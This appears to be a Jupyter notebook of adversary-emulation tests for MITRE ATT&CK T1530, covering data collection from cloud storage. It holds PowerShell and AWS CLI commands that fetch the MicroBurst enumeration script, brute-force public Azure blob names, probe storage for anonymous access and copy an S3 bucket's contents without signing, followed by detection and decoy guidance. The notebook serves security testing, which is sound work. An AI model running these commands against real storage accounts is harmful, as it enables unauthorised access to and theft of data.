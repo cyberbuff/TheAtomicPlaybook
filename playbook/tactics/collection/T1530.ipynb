{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f919760c",
   "metadata": {},
   "source": "# T1530 - Data from Cloud Storage\nAdversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
  },
  {
   "cell_type": "markdown",
   "id": "ebc35664",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "3b65c9fd",
   "metadata": {},
   "source": "### Atomic Test #1 - Azure - Enumerate Azure Blobs with MicroBurst\nUpon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n\n**Supported Platforms:** iaas:azure\n#### Dependencies:  Run with `powershell`!\n##### Description: The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\n\n```\n##### Description: The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bbbf743d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3a3b10b3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base secure -permutations \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\" -outputfile \"$env:temp\\T1530Test1.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da476065",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1d9f080d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1530Test1.txt -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83461dda",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eedcb90a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Azure - Scan for Anonymous Access to Azure Storage (Powershell)",
    "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
    "**Supported Platforms:** iaas:azure",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ntry{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06299bc9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "4a6160af",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1530Test2.txt -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f9216fc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4317b78a",
   "metadata": {},
   "source": "### Atomic Test #3 - AWS - Scan for Anonymous Access to S3\nUpon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket redatomic-test2\naws s3api put-bucket-policy --bucket redatomic-test2 --policy file://$PathToAtomicsFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://redatomic-test2\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS default profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67d68210",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "776b3915",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "efe71837",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "6e4cc428",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\naws s3 rb s3://redatomic-test2 --force \nrm -rf /tmp/redatomic-test2\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef104b7c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "73432a58",
   "metadata": {},
   "source": "## Detection\nMonitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
  },
  {
   "cell_type": "markdown",
   "id": "47c35e69",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Pocket Litter \n Place data on a system to reinforce the legitimacy of the system or user. \n\n Pocket Litter is data placed on a system to convince an adversary that the system and users are real.  Pocket litter includes documents, registry entries, log history, browsing history, connection history, and other user data that one would expect to exist on a user's computer.  This content may overlap with Decoy Content, however Pocket Litter covers aspects beyond just content (e.g.: Installed Applications, source code, clutter on a system, etc.).\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to seed content to influence an adversary's behaviors, test their interest in specific topics, or add legitimacy to a system or environment.\n#### Use Case\nA defender can stage a variety of pocket litter files on an attached storage space. This data may include topics that align to a persona, topics an adversary is interested in, etc.\n#### Procedures\nWhen staging a decoy system and user account, populate a user's folders and web history to make it look realistic to an adversary.\nStage a USB device with documents on a specific topic in order to see if they are exfiltrated by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}